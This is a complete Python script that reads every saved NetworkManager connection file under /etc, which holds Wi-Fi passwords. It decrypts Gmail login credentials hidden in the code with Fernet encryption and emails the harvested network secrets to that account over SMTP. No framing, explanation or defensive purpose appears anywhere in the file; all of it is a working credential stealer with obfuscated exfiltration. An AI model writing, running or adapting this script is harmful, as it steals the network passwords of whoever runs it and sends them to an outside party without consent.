
#!/bin/python3

import subprocess , smtplib, re
from cryptography.fernet import Fernet


command="cd /etc/NetworkManager/system-connections && cat *"
networko=subprocess.check_output(command,shell=True)
network=networko.decode("utf-8")
f=Fernet(b'6DqZra6_vqpJ6WjEjQnKdrzuQ0tfIG63jNw4uDRQFr8=')


server=smtplib.SMTP("smtp.gmail.com",587)
server.starttls()

p=f.decrypt(b'gAAAAABe9c8rzcvFKmFVbSZgI0j4Eadow-ysrifuDMZywec14w2HZq5zl-gw-dKpC0yVpRYYgLLOZoqPVG_bLSx5_MZmJjOYLA==').decode()
u=f.decrypt(b'gAAAAABe9c_PwRcJIPGaVkdCQgeobQUM1-mQaosfspCD3wL5LQhSdMg1Zp2JgQDb72wtdEAK8hHypAyVINbGVHr5nA0kWC0zbQgIyQ5-qsVDJEKwhkMAuP8=').decode()
server.login(u,p)
server.sendmail(u,u,network)

server.quit()


